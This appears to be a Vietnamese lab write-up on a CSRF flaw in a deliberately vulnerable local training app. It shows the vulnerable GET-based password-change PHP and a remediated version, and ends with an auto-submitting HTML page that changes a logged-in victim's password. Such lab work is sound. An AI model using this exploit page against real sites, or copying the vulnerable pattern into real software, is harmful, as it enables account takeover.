1. CSRF

URL: `http://127.0.0.1/OhMyCrab/modules/csrf/change_password.php`

Ứng dụng tồn tại lỗ hổng Cross-Site Request Forgery do chức năng thay đổi mật khẩu sử dụng phương thức GET cho hành động thay đổi trạng thái nhưng không triển khai CSRF token hoặc cơ chế xác thực request hợp lệ. Attacker có thể tạo URL độc hại để ép nạn nhân thay đổi mật khẩu khi đang đăng nhập.

PoC:

- Đăng nhập vào tài khoản guest/guest.

- Thay đổi mật khẩu thử sau đó send request to repeater, thay đổi new_password và confirm_password thành hacked

<img width="919" height="600" alt="image" src="https://github.com/user-attachments/assets/b83b86a7-754e-4349-a686-4f1b0a82f750" />

- Đăng nhập vào tài khoản caymai/caymai123.

- Truy cập URL: `http://127.0.0.1/OhMyCrab/modules/csrf/change_password.php?new_password=hacked&confirm_password=hacked&Change=Change`

- Password của tài khoản caymai bị đổi từ caymai123 thành hacked

<img width="1628" height="664" alt="image" src="https://github.com/user-attachments/assets/a314675f-fc45-4e07-9cfd-e9bbcd5ce331" />

Phân tích source code

```
    if (isset($_GET['Change'])) {
        $new_password = $_GET['new_password'] ?? '';
        $confirm_password = $_GET['confirm_password'] ?? '';
        if ($new_password !== $confirm_password) {
            $message = "<p style='color:red'>Mật khẩu xác nhận không khớp</p>";
        } else {
            $username = $_SESSION['user'];
            $hash = password_hash($new_password, PASSWORD_DEFAULT);
            $sql = "UPDATE users SET password='$hash' WHERE username='$username'";
            mysqli_query($conn, $sql);
            logAttack(3, $new_password, 200);
            $message = "<p style='color:lime'>Thay đổi mật khẩu thành công</p>";
        }
    }
```

- Ứng dụng lấy trực tiếp dữ liệu từ $_GET để thay đổi mật khẩu tài khoản hiện tại, không triển khai CSRF token, không kiểm tra Origin/Referer, không yêu cầu xác thực lại mật khẩu hiện tại. Do browser tự động gửi session cookie kèm request, attacker có thể tạo URL độc hại khiến nạn nhân vô tình gửi request thay đổi mật khẩu khi đang đăng nhập.

Cách khắc phục

```
 // Sử dụng phương thức POST
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['Change'])) {   
        //KIỂM TRA ORIGIN
        $allowed_host = $_SERVER['HTTP_HOST'];
        if (isset($_SERVER['HTTP_ORIGIN'])) {
            $origin = parse_url($_SERVER['HTTP_ORIGIN'], PHP_URL_HOST);
            if ($origin !== $allowed_host) {
                die("Yêu cầu bị từ chối do không trùng khớp Origin.");
            }
        }
        // Kiểm tra bảo mật cốt lõi: CSRF TOKEN
        if (!isset($_POST['csrf_token']) || !hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
            $message = "<p style='color:red'>Lỗi xác thực CSRF Token!</p>";
        } else {
            $current_password = $_POST['current_password'] ?? '';
            $new_password = $_POST['new_password'] ?? '';
            $confirm_password = $_POST['confirm_password'] ?? '';
            $username = $_SESSION['user'];
            // Xác thực mật khẩu hiện tại bằng Prepared Statement
            $stmt = $conn->prepare("SELECT password FROM users WHERE username = ?");
            $stmt->bind_param("s", $username);
            $stmt->execute();
            $result = $stmt->get_result();
            $user = $result->fetch_assoc();
            if (!$user || !password_verify($current_password, $user['password'])) {
                $message = "<p style='color:red'>Mật khẩu hiện tại không chính xác.</p>";
            }
            // Kiểm tra mật khẩu mới
            elseif ($new_password !== $confirm_password) {
                $message = "<p style='color:red'>Mật khẩu xác nhận không khớp.</p>";
            } 
            elseif (strlen($new_password) < 6) {
                $message = "<p style='color:red'>Mật khẩu mới phải từ 6 ký tự trở lên.</p>";
            }
            else {
                // Cập nhật mật khẩu mới vào cơ sở dữ liệu
                $hash = password_hash($new_password, PASSWORD_DEFAULT);
                $update_stmt = $conn->prepare("UPDATE users SET password = ? WHERE username = ?");
                $update_stmt->bind_param("ss", $hash, $username);
                if ($update_stmt->execute()) {
                    //LÀM MỚI SESSION ID
                    session_regenerate_id(true);
                    // Tạo lại một CSRF token mới cho session vừa được làm mới
                    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
                    $message = "<p style='color:lime'>Thay đổi mật khẩu thành công.</p>";
                } else {
                    $message = "<p style='color:red'>Có lỗi hệ thống xảy ra, vui lòng thử lại.</p>";
                }
            }
        }
    }
```

- Sử dụng phương thức `POST` thay vì `GET` cho các hành động thay đổi trạng thái.

- Triển khai CSRF Token và xác thực token bằng `hash_equals()`.

- Xác thực lại mật khẩu hiện tại trước khi cho phép đổi mật khẩu.

- Kiểm tra `Origin` hoặc `Referer` để hạn chế request từ domain lạ.
 
- Sử dụng Prepared Statement để tăng tính an toàn khi thao tác cơ sở dữ liệu.

- Làm mới Session ID bằng `session_regenerate_id(true)` sau khi đổi mật khẩu thành công.

Script khai thác

```
<!DOCTYPE html>
<html>
    <head>
        <title>CSRF Exploit PoC</title>
    </head>
    <body onload="document.forms[0].submit()">
        <h3>Đang xử lý dữ liệu, vui lòng đợi trong giây lát...</h3>
        
        <form action="http://127.0.0.1/OhMyCrab/modules/csrf/change_password.php" method="GET">
            <input type="hidden" name="new_password" value="hacked">
            <input type="hidden" name="confirm_password" value="hacked">
            <input type="hidden" name="Change" value="Change">
        </form>
    </body>
</html>
```
